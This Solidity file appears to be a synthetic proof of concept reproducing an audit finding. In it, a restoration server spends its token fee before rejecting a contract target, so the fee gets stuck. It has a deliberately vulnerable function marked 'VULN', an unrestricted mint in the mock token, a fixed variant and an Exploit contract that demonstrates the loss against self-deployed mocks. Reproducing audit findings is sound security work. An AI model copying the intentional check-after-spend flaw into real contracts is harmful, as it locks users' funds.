// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Overprotocol — GetRestorationProof does not reject a contract target
    (Spearbit, May 2024, finding #40985, Dtheo).
    SYNTHETIC, cheatcode-free. The server spends its fee before the restore
    fails on a contract target (@> VULN). That fee stays stuck. A checked
    path spends 0. */

contract FeePot {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract DummyTarget {}

contract StuckBox {}

contract RestorationServer {
    FeePot public immutable token;
    address public immutable stuck;
    uint256 public constant FEE = 100;
    uint256 public balance;

    constructor(FeePot token_, address stuck_) {
        token = token_;
        stuck = stuck_;
    }

    function fund(uint256 amount) external {
        balance = amount;
    }

    function fulfill(address target) external {
        require(balance >= FEE, "server balance");
        balance -= FEE;
        // @> VULN: a contract target is not rejected before the server's fee is spent.
        token.transfer(stuck, FEE);
        if (target.code.length != 0) {
            return;
        }
    }

    function fulfillChecked(address target) external {
        if (target.code.length != 0) {
            return;
        }
        require(balance >= FEE, "server balance");
        balance -= FEE;
        token.transfer(stuck, FEE);
    }
}

contract Exploit {
    FeePot public token; // nonce 1
    StuckBox public box; // nonce 2
    RestorationServer public server; // nonce 3
    DummyTarget public dummy; // nonce 4

    constructor() {
        token = new FeePot();
        box = new StuckBox();
        server = new RestorationServer(token, address(box));
        dummy = new DummyTarget();
    }

    function run() external {
        token.mint(address(server), 100);
        server.fund(100);
        require(address(dummy).code.length != 0, "target is a contract");
        uint256 before = token.balanceOf(address(box));
        server.fulfill(address(dummy));
        require(token.balanceOf(address(box)) == before + 100, "100 stuck");
        require(server.balance() == 0, "server balance spent");
        server.fulfillChecked(address(dummy));
        require(token.balanceOf(address(box)) == 100, "checked path spends 0");
        require(server.balance() == 0, "checked path leaves the spent balance");
    }
}
